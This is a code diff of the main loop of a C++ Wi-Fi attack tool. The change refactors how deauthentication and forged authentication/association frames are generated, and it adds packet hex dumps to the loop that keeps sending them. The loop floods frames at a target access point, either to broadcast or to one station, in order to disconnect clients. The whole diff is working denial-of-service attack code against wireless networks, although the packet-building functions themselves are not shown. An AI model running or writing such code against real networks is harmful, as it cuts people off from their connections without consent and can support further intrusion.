@@ -29,14 +29,14 @@ int main(int argc, char* argv[])
         return -1;
     }
 
+    DeauthAttack* pkt_generator = new DeauthAttack(param.ap_mac_, param.st_mac_);
     int res = 0;
     switch (argc)
     {
     case 3:
     {
         printf("Deauthentication attack started.\nMode=broadcast\n");
-        DeauthAttack* pkt_gen_deauth_broadcast = new DeauthAttack(param.ap_mac_, BROADCAST_MAC_ADDR, DEAUTH_ATTACK_AP_TO_BROADCAST);
-        wlan_attack_pkt* attack_pkt = pkt_gen_deauth_broadcast->get_pkt();
+        wlan_attack_pkt* attack_pkt = pkt_generator->get_pkt(DEAUTH_ATTACK_AP_TO_BROADCAST);
 
         while (res == 0)
         {
@@ -48,22 +48,23 @@ int main(int argc, char* argv[])
     case 4:
     {
         printf("Deauthentication attack started.\nMode=unicast\n");
-        DeauthAttack* pkt_gen_deauth_unicast_ap_to_st = new DeauthAttack(param.ap_mac_, param.st_mac_, DEAUTH_ATTACK_AP_TO_STATION);
-        wlan_attack_pkt* deauth_attack_pkt_ap_to_st = pkt_gen_deauth_unicast_ap_to_st->get_pkt();
-        
-        DeauthAttack* pkt_gen_deauth_unicast_st_to_ap = new DeauthAttack(param.ap_mac_, param.st_mac_, DEAUTH_ATTACK_STATION_TO_AP);
-        wlan_attack_pkt* deauth_attack_pkt_st_to_ap = pkt_gen_deauth_unicast_st_to_ap->get_pkt();
+        wlan_attack_pkt* deauth_attack_pkt_ap_to_st = pkt_generator->get_pkt(DEAUTH_ATTACK_AP_TO_STATION);
+        wlan_attack_pkt* deauth_attack_pkt_st_to_ap = pkt_generator->get_pkt(DEAUTH_ATTACK_STATION_TO_AP);
 
         while (true)
         {
             sleep(0);
             res = send_attack_pkt(handle, deauth_attack_pkt_ap_to_st);
+            dump((void*)deauth_attack_pkt_ap_to_st->packet, deauth_attack_pkt_ap_to_st->size);
+            printf("\n\n");
             if (res != 0)
             {
                 break;
             }
             
             res = send_attack_pkt(handle, deauth_attack_pkt_st_to_ap);
+            dump((void*)deauth_attack_pkt_st_to_ap->packet, deauth_attack_pkt_st_to_ap->size);
+            printf("\n\n\n\n");
             if (res != 0)
             {
                 break;
@@ -74,10 +75,8 @@ int main(int argc, char* argv[])
     case 5:
     {
         printf("Authentication attack started.\nMode=unicast\n");
-        DeauthAttack* pkt_gen_auth_unicast_st_to_ap_auth = new DeauthAttack(param.ap_mac_, param.st_mac_, AUTH_ATTTACK_STATION_TO_AP_AUTH);
-        DeauthAttack* pkt_gen_auth_unicast_st_to_ap_asso_req = new DeauthAttack(param.ap_mac_, param.st_mac_, AUTH_ATTTACK_STATION_TO_AP_ASSO_REQ);
-        wlan_attack_pkt* auth_attack_pkt_st_to_ap_auth = pkt_gen_auth_unicast_st_to_ap_auth->get_pkt();
-        wlan_attack_pkt* auth_attack_pkt_st_to_ap_asso_req = pkt_gen_auth_unicast_st_to_ap_asso_req->get_pkt();
+        wlan_attack_pkt* auth_attack_pkt_st_to_ap_auth = pkt_generator->get_pkt(AUTH_ATTTACK_STATION_TO_AP_AUTH);
+        wlan_attack_pkt* auth_attack_pkt_st_to_ap_asso_req = pkt_generator->get_pkt(AUTH_ATTTACK_STATION_TO_AP_ASSO_REQ);
 
         while (true)
         {
